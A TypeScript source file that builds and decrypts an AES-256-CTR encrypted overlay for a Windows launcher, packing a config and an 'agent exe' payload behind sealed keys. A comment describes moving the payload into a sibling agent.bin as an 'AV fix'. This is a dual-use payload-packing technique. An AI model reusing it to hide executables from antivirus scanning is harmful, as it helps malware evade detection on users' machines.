/**
 * launcher-overlay.ts — shared VNTR overlay assembly + decryption.
 *
 * The overlay layout (LOCKED, both sides in sync — see launcher/template.cs and
 * launcher/dev/make-stamp.mjs):
 *   [hdr 24B]  "VNTR" ver=1 flags(1) rsv(2) envLen u32=65 cfgLen u32 payLen u32 rsv(4)
 *   [env 65B]  AES-256-CTR(seal key/iv) over K_B(32) ‖ IV_PAY(16) ‖ IV_CFG(16) ‖ CK(1)
 *   [cfg …]    AES-256-CTR(K_B, IV_CFG) of the URL-query config
 *   [pay …]    AES-256-CTR(K_B, IV_PAY) of the agent exe
 *   [trc 12B]  cfgLen u32 | payLen u32 | "VNTZ"
 * CK is the xor of byte 0..63 of the envelope plaintext.
 */

import * as crypto from "crypto";

export const HDR_LEN = 24;
export const ENV_LEN = 65; // K_B(32) + IV_PAY(16) + IV_CFG(16) + CK(1)

// Overlay header flag bits (header byte 5).
export const FLAG_TEST_MODE = 0x01; // legacy dev/TEST marker
export const FLAG_PAYLOAD_EXTERNAL = 0x02; // payload lives in sibling agent.bin, NOT appended to the PE

export function ctr(key: Buffer, iv: Buffer, data: Buffer): Buffer {
  const c = crypto.createCipheriv("aes-256-ctr", key, iv);
  return Buffer.concat([c.update(data), c.final()]);
}

export interface OverlayOptions {
  sealKey: Buffer;
  sealIv: Buffer;
  kb: Buffer;
  ivPay: Buffer;
  ivCfg: Buffer;
  configText: string;
  payload: Buffer;
  payloadCipher?: Buffer; // pre-computed re-key (payloadCache.reKey) — same CTR
  flags: number; // bit0 = TEST_MODE, bit1 = PAYLOAD_EXTERNAL
  /** true (Option A / AV fix): do NOT embed the payload ciphertext in the PE;
   *  it is shipped as a sibling agent.bin (built by buildAgentBin()). The PE
   *  keeps the envelope + config + trailer; payLen still records the cipher
   *  length so the launcher knows what to expect from agent.bin. */
  externalPayload?: boolean;
}

/**
 * Encrypt the agent payload under K_B/IV_PAY. This is the byte stream written
 * to the sibling `agent.bin` when externalPayload is set — AES-256-CTR cipher
 * of the agent; size == agent size. Same ciphertext the old inline overlay used.
 */
export function buildAgentBin(opts: OverlayOptions): Buffer {
  return opts.payloadCipher ?? ctr(opts.kb, opts.ivPay, opts.payload);
}

/** Assemble the overlay appended after the PE — byte-identical to make-stamp.mjs.
 *  When externalPayload is set the [pay] section is OMITTED from the exe (the
 *  bytes go to agent.bin) and the trailer's payLen still records its length. */
export function assembleOverlay(opts: OverlayOptions): Buffer {
  const envPlain = Buffer.concat([opts.kb, opts.ivPay, opts.ivCfg]);
  let ck = 0;
  for (const b of envPlain) ck ^= b;
  const envelope = ctr(
    opts.sealKey,
    opts.sealIv,
    Buffer.concat([envPlain, Buffer.from([ck & 0xff])])
  );

  const encCfg = ctr(opts.kb, opts.ivCfg, Buffer.from(opts.configText, "utf8"));
  const encPay = buildAgentBin(opts);
  const external = !!opts.externalPayload;

  const flags = opts.flags | (external ? FLAG_PAYLOAD_EXTERNAL : 0);
  const hdr = Buffer.alloc(HDR_LEN);
  hdr.write("VNTR", 0, "ascii");
  hdr[4] = 1; // version
  hdr[5] = flags;
  hdr.writeUInt32LE(ENV_LEN, 8);
  hdr.writeUInt32LE(encCfg.length, 12);
  hdr.writeUInt32LE(encPay.length, 16);

  const trc = Buffer.alloc(12);
  trc.writeUInt32LE(encCfg.length, 0);
  trc.writeUInt32LE(encPay.length, 4);
  trc.write("VNTZ", 8, "ascii");

  if (external) {
    // [hdr][env][cfg][trc] — the 12-byte trailer follows the config directly.
    return Buffer.concat([hdr, envelope, encCfg, trc]);
  }
  return Buffer.concat([hdr, envelope, encCfg, encPay, trc]);
}

/**
 * Invert the overlay: locate the trailer at EOF, decrypt the envelope with the
 * launcher's seal, then decrypt config (+ payload) under K_B. Used by the WP6
 * payload round-trip check (must equal the source payload byte-for-byte).
 * When the overlay has FLAG_PAYLOAD_EXTERNAL the payload ciphertext must be
 * supplied via `agentBin` (the sibling agent.bin bytes).
 */
export function decryptOverlay(
  stamped: Buffer,
  sealKey: Buffer,
  sealIv: Buffer,
  agentBin?: Buffer
): { config: string; payload: Buffer } {
  const size = stamped.length;
  if (size < HDR_LEN + ENV_LEN + 16) throw new Error("stamped exe too small");
  const t = size - 12;
  if (stamped.subarray(t + 8, t + 12).toString("ascii") !== "VNTZ") {
    throw new Error("missing VNTZ trailer");
  }
  const cfgLen = stamped.readUInt32LE(t);
  const payLen = stamped.readUInt32LE(t + 4);
  if (
    cfgLen <= 0 ||
    cfgLen > 64 * 1024 ||
    payLen <= 0 ||
    payLen > 256 * 1024 * 1024
  ) {
    throw new Error("overlay length fields out of range");
  }
  // Peek the external flag from the header (requires at least hdr+env+cfg).
  if (size < HDR_LEN + ENV_LEN + cfgLen + 12) {
    throw new Error("stamped exe too small for overlay");
  }
  const flagsOff = size - (HDR_LEN + ENV_LEN + cfgLen + 12);
  const external = (stamped[flagsOff + 5] & FLAG_PAYLOAD_EXTERNAL) !== 0;

  const bodyLen = HDR_LEN + ENV_LEN + cfgLen;
  const ovLen = bodyLen + (external ? 0 : payLen);
  const off = size - ovLen - 12;
  if (off < 0) throw new Error("overlay offset negative");
  const ov = stamped.subarray(off, off + ovLen);
  if (ov.subarray(0, 4).toString("ascii") !== "VNTR") {
    throw new Error("missing VNTR magic");
  }
  if (ov[4] !== 1) throw new Error("unexpected overlay version");
  if (
    ov.readUInt32LE(8) !== ENV_LEN ||
    ov.readUInt32LE(12) !== cfgLen ||
    ov.readUInt32LE(16) !== payLen
  ) {
    throw new Error("header/trailer length mismatch");
  }
  const env = ctr(sealKey, sealIv, ov.subarray(HDR_LEN, HDR_LEN + ENV_LEN));
  let ck = 0;
  for (let i = 0; i < 64; i++) ck ^= env[i];
  if (ck !== (env[64] & 0xff)) throw new Error("envelope checksum mismatch");
  const kb = env.subarray(0, 32);
  const ivPay = env.subarray(32, 48);
  const ivCfg = env.subarray(48, 64);
  const config = ctr(
    kb,
    ivCfg,
    ov.subarray(HDR_LEN + ENV_LEN, HDR_LEN + ENV_LEN + cfgLen)
  ).toString("utf8");

  let payload: Buffer;
  if (external) {
    if (!agentBin) {
      throw new Error("overlay is PAYLOAD_EXTERNAL but agentBin was not supplied");
    }
    if (agentBin.length !== payLen) {
      throw new Error(
        `agent.bin length ${agentBin.length} != payLen ${payLen}`
      );
    }
    payload = ctr(kb, ivPay, agentBin);
  } else {
    payload = ctr(
      kb,
      ivPay,
      ov.subarray(HDR_LEN + ENV_LEN + cfgLen, HDR_LEN + ENV_LEN + cfgLen + payLen)
    );
  }
  return { config, payload };
}